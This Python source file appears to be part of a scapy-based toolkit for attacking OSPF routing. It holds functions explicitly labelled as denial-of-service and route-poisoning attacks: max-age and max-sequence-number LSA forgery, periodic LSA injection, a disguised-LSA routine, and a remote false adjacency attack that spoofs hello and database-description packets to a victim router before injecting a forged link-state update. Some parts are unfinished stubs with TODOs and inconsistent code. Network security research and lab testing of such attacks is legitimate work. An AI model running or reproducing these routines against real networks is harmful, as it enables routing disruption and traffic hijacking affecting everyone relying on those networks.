import asyncio
from sys import flags
from typing import List
from scapy.contrib.ospf import *
from scapy.sendrecv import sniff
from scapy.packet import Packet
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, send
from scapy.utils import atol, ltoa
from libs.aux_funcs import type_wrapper, OSPF_Link as OSPF_Link_Patched, send_l3_single
from time import sleep
from threading import Thread

OSPF_Link = OSPF_Link_Patched

def _ospf_sniff(iface, timeout=30*60) -> List:
    lst = sniff(count = 0, filter= "proto ospf", timeout=timeout, iface=iface)
    return lst

def _ospf_bruteforce_checksum(evil, checksum):

    pass


def _ospf_reset_lsu_chksum(pkt: Packet) -> Packet:
    pkt[IP].len = None
    pkt[IP].chksum = None
    pkt[OSPF_Hdr].chksum = None
    pkt[OSPF_Hdr].len = None
    pkt[OSPF_LSUpd].chksum = None
    pkt[OSPF_LSUpd].len = None
    return pkt


def _ospf_parse_lsa(args):

    ospf = args['lsu_info']['ospf']

    # Build the LSU/LSA list
    lsalist = []
    raw_lsalist = ospf['lsa_list']
    
    for raw_lsa in raw_lsalist:
        lsa_type = raw_lsa['type']

        if lsa_type == 'router_lsa':
            
            flgs = raw_lsa['v'] << 2 | raw_lsa['e'] << 1 | raw_lsa['b']
            nlink_lst = []

            for rlink in raw_lsa['links']:
                nlink = OSPF_Link(id=rlink['link_id'], data=rlink['link_data'], type=rlink['type'], metric=rlink['metric'])
                nlink_lst.append(nlink)

            nlsa = OSPF_Router_LSA(flags=flgs, id=raw_lsa['ls_id'], adrouter=ospf['router_id'], linklist=nlink_lst, linkcount=len(nlink_lst))

        elif lsa_type == 'network_lsa':
            nlsa = OSPF_Network_LSA(id = raw_lsa['ls_id'], adrouter = raw_lsa['adv_router'], mask = raw_lsa['mask'], routerlist = raw_lsa['attached_router'])
            

        elif lsa_type == 'summary_lsa':
            if raw_lsa['lsa_type'] == 3: # Type 3 LSA
                nlsa = OSPF_SummaryIP_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], mask = raw_lsa['mask'], metric = raw_lsa['metric'])
            elif raw_lsa['lsa_type'] == 4: #Type 4 LSA
                nlsa = OSPF_SummaryASBR_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], mask = raw_lsa['mask'], metric = raw_lsa['metric'])
            

        elif lsa_type == 'external_lsa':
            nlsa = OSPF_External_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], mask = raw_lsa['mask'], ebit = raw_lsa['e'], metric = raw_lsa['metric'], fwdaddr = raw_lsa['fwd_addr'], tag = raw_lsa['ext_rt_tag'])

        elif lsa_type == 'nssa_lsa':
            nlsa = OSPF_External_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], mask = raw_lsa['mask'], ebit = raw_lsa['e'], metric = raw_lsa['metric'], fwdaddr = raw_lsa['fwd_addr'], tag = raw_lsa['ext_rt_tag'])

        else:
            pass

        lsalist.append(nlsa)

    # TODO check authentication
    pkt = OSPF_Hdr(type=4,src = ospf['router_id'], area = ospf['area_id'])/OSPF_LSUpd(lsalist=lsalist,lsacount=len(lsalist))

    return pkt

@type_wrapper(name="Max Age LSA", type="DoS", category="attack", layer="L3 - OSPF", arg_list=[])
def ospf_max_age(args):
    pkt = args['pkt']

    # Set max age in LSA_hdr
    pkt[OSPF_LSUpd].lsalist[0].age = 3600
    # MAX AGE attack also increases seq number by 1
    pkt[OSPF_LSUpd].lsalist[0].seq += 1

    # Re-calc checksums and len
    pkt = _ospf_reset_lsu_chksum(pkt)
    
    #return packet
    args['pkt'] = pkt
    return args

@type_wrapper(name="Seq++ Attack", type="DoS", category="attack", layer="L3 - OSPF", arg_list=[])
def ospf_seq_increment(args):
    pkt = args['pkt']

    # Increment seq# in LSA_hdr
    pkt[OSPF_LSUpd].lsalist[0].seq += 1

    # Modify metric
    pkt[OSPF_LSUpd].lsalist[0].metric += 10

    # Re-calc checksums and len
    pkt = _ospf_reset_lsu_chksum(pkt)

    args['pkt'] = pkt
    return pkt

# NOTE: Performing the attack as is on a c3725 router will lead to instability where the originator will try to continuosly purge the LSA, but won't be able to
@type_wrapper(name="Max Seq # LSA", type="DoS", category="attack", layer="L3 - OSPF", arg_list=[])
def ospf_max_seq_num(args):
    pkt = args['pkt']

    # Set seq# to max in LSA_Hdr
    pkt[OSPF_Hdr].lsalist[0].seq = 0x7FFFFFFF

    # Modify metric
    # TODO give option to choose metric value
    pkt[OSPF_Hdr].lsalist[0].metric += 10

    # Re-calc checksums and len
    pkt = _ospf_reset_lsu_chksum(pkt)

    args['pkt'] = pkt
    return args


@type_wrapper(name="Periodic Injection", type="DoS", category="Attack", layer="L3 - OSPF", arg_list=[])
def ospf_periodic_injection(args):
    period = 5 #seconds

    #get the lsa
    pkt = args['pkt']

    # modify it
    # TODO decide which modifications to make

    # increase seq#, reset checksums


    # send the initial one
    sendp(pkt, iface=args['iface'])

    sleep(2)
    # send it in a loop
    try:
        while True:
            # TODO increase seq#
            sendp(pkt, iface=args['iface'])
            sleep(period)
    except KeyboardInterrupt:
        return


@type_wrapper(name="Disguised LSA", type="Route Poisoning", category="Attack", layer="L3 - OSPF", arg_list=[])
def ospf_disguised_lsa(args):

    pkt = args['pkt']

    # Create 3 packets
    pkt1, pkt2, pkt3 = pkt.copy(), pkt.copy(), pkt.copy()

    # adapt pkt's parameters to match the fightback lsa
    pkt3[OSPF_LSUpd].lsalist[0].seq += 2
    pkt3 = _ospf_reset_lsu_chksum(pkt3)
    
    # Extract the checksum
    fightback_chksum = Ether(pkt3.build())[OSPF_LSUpd].lsalist[0].chksum

    # pkt1 will trigger fight-back
    pkt1[OSPF_LSUpd].lsalist[0].metric=0
    pkt1[OSPF_LSUpd].lsalist[0].seq += 1

    # reset checksum and len for pkt1
    pkt1 = _ospf_reset_lsu_chksum(pkt1)

    # pkt2 is the evil lsa
    pkt2 = _ospf_reset_lsu_chksum(pkt2)
    pkt2[OSPF_LSUpd].lsalist[0].metric = 30
    pkt2[OSPF_LSUpd].lsalist[0].toscount = 1
    pkt2[OSPF_LSUpd].lsalist[0].tos=1

    pkt2[OSPF_LSUpd].lsalist[0].tosmetric = _ospf_bruteforce_checksum(pkt2, fightback_chksum)

    #TODO test this ^
    


    return args


async def _ospf_loop_hello(pkt, iface):
    try:
        while True:
            send(pkt,iface=iface)
            await asyncio.sleep(10) # TODO sleep for max hello interval
    except asyncio.CancelledError:
        return


@type_wrapper(name="Remote False Adjacency", type="Route Poisoning", category="Attack", layer="L3 - OSPF", arg_list=["victim_IP","victim_id"])
def ospf_remote_false_adjacency(args):

    async def _ospf_loop_hello(args):

        victim_IP = args['victim_IP']
        victim_id = args['victim_id']

        # Phantom ID must be 1 higher than victim
        phantom_IP = args['lsu_info']['ospf']['interface_addr']
        phantom_id = args['lsu_info']['ospf']['router_id']
        mask = args['lsu_info']['ospf']['interface_netmask']
        area_id = args['lsu_info']['ospf']['area_id']

        hello_tlv = OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
        hello_payld = OSPF_Hello(router=victim_IP,backup=victim_IP,mask=mask,neighbors=[victim_id],options=0x12)
        hello_hdr = OSPF_Hdr(src=phantom_id, area=area_id)
        hello_IP = IP(src=phantom_IP, dst = victim_IP)

        hello_pkt = hello_IP/hello_hdr/hello_payld/hello_tlv

        try:
            while True:
                print("Sending hello pkt...")
                send(hello_pkt,iface=args['iface'],verbose=False)
                await asyncio.sleep(30) # TODO sleep for max hello interval ?
        except asyncio.CancelledError:
            return

    async def _dbd_coro(args):
        victim_IP = args['victim_IP']
        
        
        # Phantom ID must be 1 higher than victim
        phantom_IP = args['lsu_info']['ospf']['interface_addr']
        area_id = args['lsu_info']['ospf']['area_id']

        # sleep for 2 sec so the hello coroutine executes first
        await asyncio.sleep(5)

        # First, send hello and do dbd exchange
        db_seq = 1 # TODO randomize seq # ?

        dbd1 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_IP, area=area_id)/OSPF_DBDesc(dbdescr=0x07, ddseq=db_seq, options=0x52)/OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
        print("Sending dbd1...")
        send(dbd1, iface=args['iface'],verbose=False)
        await asyncio.sleep(4)

        # Send 8? dbd messages
        for c in range(0,8):
            db_seq += 1
            dbd2 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_IP, area=area_id)/OSPF_DBDesc(dbdescr=0x03, ddseq=db_seq, options=0x52)/OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
            print("Sending dbd2...")
            send(dbd2, iface=args['iface'],verbose=False)
            await asyncio.sleep(4)

        # Terminate dbd exchange
        db_seq += 1
        dbd3 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_IP, area=area_id)/OSPF_DBDesc(dbdescr=0x01, ddseq=db_seq, options = 0x52)/OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
        print("Sending dbd3...")
        send(dbd3, iface=args['iface'],verbose=False)
        
        # Wait 50 secs for db exchange to clear
        await asyncio.sleep(50)


        # Send fake lsu
        lsu = _ospf_parse_lsa(args)

        lsu_pkt = IP(src=phantom_IP, dst=victim_IP)/lsu
        print("Injecting LSU...")
        send(lsu_pkt,iface=args['iface'],verbose=False)

        print("Done")
        print("Press ctrl+c to interrupt attack...")
        return

    async def main(args):
        # Start hello and dbd coroutines, block until ctrl+c
        try:
            gth = await asyncio.gather(asyncio.create_task(_ospf_loop_hello(args)), asyncio.create_task(_dbd_coro(args)))
        except KeyboardInterrupt:
            gth.cancel()

    asyncio.run(main(args))    
   
               






